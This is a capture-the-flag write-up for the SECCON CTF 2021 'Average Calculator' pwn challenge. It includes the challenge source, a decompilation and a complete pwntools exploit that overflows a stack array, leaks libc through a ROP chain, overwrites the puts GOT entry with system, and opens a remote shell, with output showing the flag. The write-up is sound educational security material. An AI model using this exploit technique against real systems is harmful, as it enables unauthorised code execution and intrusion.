# SECCON CTF 2021

## Average Calculator

> 129
>
> Average is the best representative value!
> 
> `nc average.quals.seccon.jp 1234`
>
> Author: kusano
> 
> [`average.tar.gz`](average.tar.gz)

Tags: _pwn_ _x86-64_ _bof_ _remote-shell_ _rop_ _got-overwrite_


## Summary

Basic leak libc and get shell with second pass ROP, however it's not just a simple BOF, we'll have to do a little bit of work.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE, no canary = easier BOF/ROP/GOT overwrite.


### Source Included

```c
int main()
{
    long long n, i;
    long long A[16];
    long long sum, average;

    alarm(60);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    printf("n: ");
    if (scanf("%lld", &n)!=1)
        exit(0);
    for (i=0; i<n; i++)
    {
        printf("A[%lld]: ", i);
        if (scanf("%lld", &A[i])!=1)
            exit(0);
        //  prevent integer overflow in summation
        if (A[i]<-123456789LL || 123456789LL<A[i])
        {
            printf("too large\n");
            exit(0);
        }
    }

    sum = 0;
    for (i=0; i<n; i++)
        sum += A[i];
    average = (sum+n/2)/n;
    printf("Average = %lld\n", average);
}
```

`A[16]` is a 16 element array, however nothing checks `n`, so writing out of bounds is pretty simple, however we still need to be careful.  Ghidra can help us:

### Decompile with Ghidra

```c
undefined8 main(void)
{
  int iVar1;
  long lVar2;
  long local_a8 [16];
  long local_28;
  long local_20;
  long local_18;
  long local_10;
  
  alarm(0x3c);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  printf("n: ");
  iVar1 = __isoc99_scanf(&DAT_00402008,&local_28);
  if (iVar1 != 1) {
                    // WARNING: Subroutine does not return
    exit(0);
  }
  local_10 = 0;
  while( true ) {
    if (local_28 <= local_10) {
      local_18 = 0;
      for (local_10 = 0; local_10 < local_28; local_10 = local_10 + 1) {
        local_18 = local_18 + local_a8[local_10];
      }
      lVar2 = local_18 + local_28 / 2;
      local_20 = lVar2 / local_28;
      printf("Average = %lld\n",local_20,lVar2 % local_28);
      return 0;
    }
    printf("A[%lld]: ",local_10);
    iVar1 = __isoc99_scanf(&DAT_00402008,local_a8 + local_10);
    if (iVar1 != 1) break;
    if ((local_a8[local_10] < -0x75bcd15) || (0x75bcd15 < local_a8[local_10])) {
      puts("too large");
      exit(0);
    }
    local_10 = local_10 + 1;
  }
  exit(0);
}
```

As we overwrite memory we'll have to be careful with a couple of the variables so that we do not mess up the loop logic.

The array is `local_a8` and is `0xa8` from the end of the stack frame (where the return address is and where we need to land our ROP chain).

`local_28` is `n`:

```
printf("n: ");
iVar1 = __isoc99_scanf(&DAT_00402008,&local_28);
```

So we'll need to preserve this, or this loop:

```
for (local_10 = 0; local_10 < local_28; local_10 = local_10 + 1) {
```

will not have the desired results.  `local_10` (`i`) as well will need to be correctly handled.

There's one more _gotcha_:

```
if (A[i]<-123456789LL || 123456789LL<A[i])
```

Input checking.  This will require a bit of creativity.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *
from binascii import hexlify

binary = context.binary = ELF('./average', checksec=False)

if args.REMOTE:
    p = remote('average.quals.seccon.jp', 1234)
    libc = ELF('./libc.so.6', checksec=False)
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
```

Standard pwntool header.

```python
pop_rdi = binary.search(asm('pop rdi; ret')).__next__()

rop = [
    pop_rdi,
    binary.got.puts,
    binary.plt.puts,
    binary.sym.main
]

payload  = []
payload += ((0xa8 - 0x28) // 8) * [0xAAAA]
payload += [(0xa8 // 8) + len(rop)]
payload += 2 * [0xBBBB]
payload += [len(payload)]
payload += ((0xa8 // 8) - len(payload)) * [0xCCCC]
payload += rop

for i in payload: assert(-123456789 <= i <= 123456789)

n = len(payload)
log.info('n: {n}'.format(n = n))

p.sendlineafter(b': ',str(n).encode())
for i in payload: p.sendlineafter(b': ',str(i).encode())
p.recvuntil(b'Average')
p.recvline()

_ = p.recv(6)
libc.address = u64(_ + b'\0\0') - libc.sym.puts
log.info('libc.address: {x}'.format(x = hex(libc.address)))
```

The array `rop` should look familiar if you've ever done a basic two pass ROP chain.  Basically, leak the location of libc `puts` by having `puts` _puts_ itself out there, then loop back to `main` for a second pass.

The payload is a bit tricker.  We have to preserve `local_28` (`n`) and `local_10` (`i`).

Start with filling memory (the array) from the begining of the array `local_a8` to the start of `local_28`, i.e. `((0xa8 - 0x28) // 8) * [0xAAAA]`.

Next set `local_28` (`n`) _back_ to the total length of the payload (remember this payload will be sent after we answer the prompt `n: `; we need to keep that set correctly).  The total length of the payload is the distance to the return address + the length of our ROP chain.

`local_20` and `local_18` get set each time in the loop, so no worries if you overwrite these.

Next up is `local_10` (`i`), at this point in the payload the length of the payload is `i`, so just set it.

Lastly, filler, until the end of the stack frame (probably only the preserved base pointer).

Finally, our ROP chain.

The next line checks our payload will pass the input check in the binary.  Then we submit the length of our array and the array contents.  On return our ROP chain will run and leak the location of libc.

```python
lld = binary.search(b'%lld').__next__()
pop_rsi_r15 = binary.search(asm('pop rsi; pop r15; ret')).__next__()

rop = [
    pop_rdi,
    lld,
    pop_rsi_r15,
    binary.got.puts,
    0xAAAA,
    binary.plt.__isoc99_scanf,
    pop_rdi,
    lld,
    pop_rsi_r15,
    binary.bss() + 0x100,
    0xBBBB,
    binary.plt.__isoc99_scanf,
    pop_rdi+1,
    pop_rdi,
    binary.bss() + 0x100,
    binary.plt.puts
]

payload  = []
payload += ((0xa8 - 0x28) // 8) * [0xAAAA]
payload += [(0xa8 // 8) + len(rop)]
payload += 2 * [0xBBBB]
payload += [len(payload)]
payload += ((0xa8 // 8) - len(payload)) * [0xCCCC]
payload += rop

for i in payload: assert(-123456789 <= i <= 123456789)

n = len(payload)
log.info('n: {n}'.format(n = n))

p.sendlineafter(b': ',str(n).encode())
for i in payload: p.sendlineafter(b': ',str(i).encode())
p.recvuntil(b'Average')
p.recvline()

p.sendline(str(libc.sym.system).encode())
p.sendline(str(int('0x' + hexlify(b'/bin/sh'[::-1]).decode(),16)).encode())
p.interactive()
```

The second pass is like the first, but with a different ROP chain, so I'll just cover that.

libc, `system`, etc... are larger than `123456789`, so if we naively try to just write out _pop rdi location of /bin/sh call system_, we'll be rejected with `too large`.

So, we'll just call `scanf` from the GOT to read in the location of `system` into the `puts` GOT entry, so that future calls to `puts` will be `system`, then do that a second time to put the string `/bin/sh\0` into the BSS (scratch space), then just call it with `puts`.

There are numerous ways to solve this, this is just _a_ way.

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to average.quals.seccon.jp on port 1234: Done
[*] n: 25
[*] libc.address: 0x7f3f51c33000
[*] n: 37
[*] Switching to interactive mode
$ id
uid=1000(average) gid=1000(average) groups=1000(average)
$ cat flag*
SECCON{M4k3_My_4bi1i7i3s_4v3r4g3_in_7h3_N3x7_Lif3_cpwWz9jpoCmKYBvf}
```
